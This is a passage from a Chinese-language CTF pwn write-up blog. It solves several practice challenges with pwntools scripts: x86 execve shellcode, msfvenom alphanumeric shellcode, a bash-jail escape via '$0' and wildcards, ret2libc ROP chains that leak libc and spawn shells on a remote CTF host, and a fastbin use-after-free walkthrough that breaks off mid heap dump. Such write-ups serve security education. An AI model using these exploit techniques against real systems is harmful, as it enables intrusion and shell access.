class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">flaglen = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">  payload = <span class="number">176</span> * <span class="string">'\x00'</span></span><br><span class="line">  payload += p32(<span class="number">0x804a060</span> + i)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">    flaglen = i</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flaglen: '</span>, flaglen</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(flaglen):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    payload = chr(j) + flag</span><br><span class="line">    payload = payload.ljust(<span class="number">176</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p32(<span class="number">0x804a060</span> + flaglen - i <span class="number">-1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">      flag = chr(j) + flag</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'flag:'</span>,flag</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p>超简单的shellcode，直接干就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10004</span>)</span><br><span class="line">payload = <span class="string">"\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h3><p>一样是写shellcode，但是只能是大写字母和数字，可以用msfvenom生成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_upper BufferRegister=EAX -f python</span><br><span class="line">shellcode =  &quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8MI1BE62HVMSSMYM7E8VOSCCX302HFO2BU92NK9M3QBZHUXEPUPS0VOE2SY2NFO2S58C00WPSK9KQ8MMPAA&quot;</span><br></pre></td></tr></table></figure></p><h3 id="bash-jail"><a href="#bash-jail" class="headerlink" title="bash_jail"></a>bash_jail</h3><p>hint:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.目录结构:</span><br><span class="line">/# ls -l</span><br><span class="line">total 32</span><br><span class="line">-rwxr-x--- 1 root ctf 6352 Feb 13 04:26 bash_jail</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 dev</span><br><span class="line">-rwxr----- 1 root ctf 38 Feb 13 04:26 flag</span><br><span class="line">drwxr-xr-x 27 root root 4096 Feb 13 04:27 lib</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 13 04:27 lib32</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:27 lib64</span><br><span class="line"></span><br><span class="line">/bin# ls -l</span><br><span class="line">total 340</span><br><span class="line">-rwxr-xr-x 1 root root 52080 Feb 13 04:28 cat</span><br><span class="line">-rwxr-xr-x 1 root root 126584 Feb 13 04:28 ls</span><br><span class="line">-rwxr-xr-x 1 root root 154072 Feb 13 04:28 sh</span><br><span class="line"></span><br><span class="line">2.考虑下system源码?</span><br><span class="line">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</span><br><span class="line"></span><br><span class="line">3.学习一下shell的变量,正则等等?</span><br><span class="line">https://linux.die.net/man/1/bash</span><br><span class="line"></span><br><span class="line">4.如果正赛出这种题,大概是这样的:https://www.youtube.com/watch?v=6D1LnMj0Yt0</span><br></pre></td></tr></table></figure></p><p>伪代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  lineptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== easy bash jail ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;n;</span><br><span class="line">    getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400706(lineptr) ) <span class="comment">//过滤了一些关键字母 abcfhgilnst*</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hacker!! go away~~ QAQ"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      system(lineptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>方法一：考虑到system执行命令时<code>argv[0]</code>是sh(见源码),而<code>argv[0]</code>可以用<code>$0</code>这个变量来打印因此只要输入 <code>$0</code> 即可getshell.</p><p>方法二：可以用 <code>???/??? ????</code> ,<code>?</code>可以做通配符，根据提示<code>???/???</code>可以匹配到<code>/bin/cat</code></p><h3 id="hacker-system-ver1"><a href="#hacker-system-ver1" class="headerlink" title="hacker_system_ver1"></a>hacker_system_ver1</h3><p>程序提供了add，print和delete的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80489BB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to hacker system ver1.0\n\n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      v0 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      print_hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del_hacker();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild command."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="keyword">if</span> ( add_hacker() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"add failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>print和delete都有简单的栈溢出可利用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"searched by name, input name length:"</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  result = read_str((<span class="keyword">int</span>)&amp;s1, v2);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hacker_list[i];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(hacker_list[i] + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">printf</span>(</span><br><span class="line">                   <span class="string">"id:%u, name:%s, age:%u, intro:%s\n"</span>,</span><br><span class="line">                   *(_DWORD *)hacker_list[i],</span><br><span class="line">                   hacker_list[i] + <span class="number">4</span>,</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">36</span>),</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">40</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span> )</span><br><span class="line"></span><br><span class="line">print_hacker_addr = <span class="number">0x8048a20</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p32(elf.symbols[<span class="string">'puts'</span>]) + p32(print_hacker_addr) + p32(elf.got[<span class="string">'printf'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h3><p>同ver1，只是变成64位<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10008</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span> )</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x400fb3</span></span><br><span class="line">print_hacker_addr = <span class="number">0x400c63</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p64(pr) + p64(elf.got[<span class="string">'read'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(print_hacker_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p64(pr) + p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h3><p>hacker资料结构体：（共0x38 byte）</p><table><thead><tr><th>内容</th><th>大小</th></tr></thead><tbody><tr><td>age</td><td>8 byte</td></tr><tr><td>name</td><td>32 byte</td></tr><tr><td>id</td><td>8 byte</td></tr><tr><td>intro addr</td><td>8 byte</td></tr></tbody></table><p>漏洞点很明显，在del那里，会删除同名的所有hacker资料，但是只情空了最后一个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">del_hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  read_str(&amp;s1, <span class="number">32L</span>L);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( list_table[i] &amp;&amp; !<span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(list_table[i] + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      v2 = i;</span><br><span class="line">      ptr = (<span class="keyword">void</span> **)list_table[i];</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">6</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    list_table[v2] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"delete hacker %s done!!\n"</span>, &amp;s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，先把libc基址和stack地址泄露出来。利用步骤是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><p>先新建两个，intro大小为0x20，然后看一下heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap all</span><br><span class="line">Top Chunk:  0x1c8e2a0</span><br><span class="line">Last Remainder:  0x0</span><br><span class="line">0x1c8e000</span><br><span class="line">0x1c8e000 SIZE=0x40 DATA[0x1c8e010] |(.......vvv_347.................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e040 SIZE=0x30 DATA[0x1c8e050] |have a good command of re.......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e070 SIZE=0x40 DATA[0x1c8e080] |........hammer..................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0b0 SIZE=0x30 DATA[0x1c8e0c0] |have a good command of web......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0e0 SIZE=0x40 DATA[0x1c8e0f0] |................................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e120 SIZE=0x30 DATA[0x1c8e130] |have a good command of web and c| INUSED PREV_INUSE</span><br><span class="line">0x1c8e150 SIZE=0x40 DATA[0x1c8e160] |........veritas501..............| INUSED PREV_INUSE</span><br><span class="line">0x1c8e190 SIZE=0x30 DATA[0x1c8e1a0] |...............................j| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e2a0 SIZE=0x20d60 TOP_CHUNK</span><br></pre></td></tr></table></figure></p><p>然后把aaa删掉，那么现在有两个0x40的fastbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap freed</span><br><span class="line">FASTBINS:</span><br><span class="line">Fastbin1 : </span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">Fastbin2 : </span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |........aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |........aaa.....................| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>现在，可以新建一个bbb，intro大小为0x38，就是跟结构体的大小一致，目的是伪造一个结构体。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br></pre></td></tr></table></figure></p><p>可以看到，之前freed的两个0x40大小fastbin被利用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xc6e1c0 SIZE=0x40 DATA[0xc6e1d0] |........puts....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e200 SIZE=0x30 DATA[0xc6e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0xc6e230 SIZE=0x40 DATA[0xc6e240] |........bbb.....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e270 SIZE=0x30 